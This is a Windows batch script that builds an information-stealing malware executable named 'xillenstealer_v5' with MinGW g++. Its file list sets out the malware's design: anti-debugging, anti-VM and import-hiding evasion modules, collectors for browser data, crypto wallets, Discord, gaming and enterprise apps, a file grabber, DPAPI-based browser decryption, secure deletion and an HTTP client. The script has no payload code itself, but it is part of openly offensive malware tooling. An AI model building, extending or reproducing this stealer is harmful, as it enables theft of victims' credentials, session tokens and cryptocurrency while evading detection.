@echo off
cd /d "%~dp0"

set MINGW_PATH=C:\msys64\mingw64\bin
set GXX=%MINGW_PATH%\g++.exe

echo Building...

%GXX% -o xillenstealer_v5.exe src/core/main.cpp src/core/stealer.cpp src/evasion/anti_debug.cpp src/evasion/anti_vm.cpp src/evasion/api_hammering.cpp src/evasion/import_hiding.cpp src/evasion/runtime_decrypt.cpp src/collectors/browser_collector.cpp src/collectors/wallet_collector.cpp src/collectors/app_collector.cpp src/collectors/discord_collector.cpp src/collectors/enterprise_collector.cpp src/collectors/file_grabber.cpp src/collectors/gaming_collector.cpp src/collectors/browser_decryptor.cpp src/crypto/aes.cpp src/crypto/dpapi.cpp src/crypto/hash.cpp src/crypto/chacha20.cpp src/memory/memory_archive.cpp src/memory/memory_encrypt.cpp src/memory/secure_delete.cpp src/utils/http_client.cpp src/utils/json_builder.cpp src/utils/mutex.cpp src/external/sqlite3.c -DSQLITE_THREADSAFE=0 -DSQLITE_OMIT_LOAD_EXTENSION -lwininet -lwinhttp -lcrypt32 -liphlpapi -lpsapi -lshell32 -lshlwapi -lbcrypt -O3 -s -static -std=c++20

if %ERRORLEVEL% EQU 0 (
    echo [+] Build successful!
    dir /b xillenstealer_v5.exe
) else (
    echo [!] Build failed with error code %ERRORLEVEL%
)

pause
